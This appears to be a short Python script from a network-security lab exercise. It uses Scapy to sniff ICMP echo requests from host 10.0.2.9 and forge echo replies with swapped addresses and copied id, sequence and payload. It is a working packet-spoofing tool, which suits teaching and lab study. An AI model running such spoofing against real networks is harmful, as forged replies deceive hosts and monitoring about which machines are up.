#!/usr/bin/env python
# -*- coding: utf-8 -*-

from scapy.all import *

def spoofpkt(pkt):
	newseq = 0
	if ICMP in pkt:
		print("Original packet info:")
		print("Source IP: ", pkt[IP].src)
		print("Destination IP: ", pkt[IP].dst)
		
		srcip = pkt[IP].dst
		dstip = pkt[IP].src
		newihl = pkt[IP].ihl
		newtype = 0
		newid = pkt[ICMP].id
		newseq = pkt[ICMP].seq
		data = pkt[Raw].load
		
		IPLayer = IP(src=srcip, dst=dstip, ihl=newihl)
		ICMPpkt = ICMP(type=newtype, id=newid, seq=newseq)
		newpkt = IPLayer/ICMPpkt/data
		
		print("Spoofed packet:")
		print("Source IP: ", newpkt[IP].src)
		print("Destination IP: ", newpkt[IP].dst)
		
		send(newpkt, verbose=0)
		
pkt = sniff(filter='icmp and src host 10.0.2.9', prn = spoofpkt)

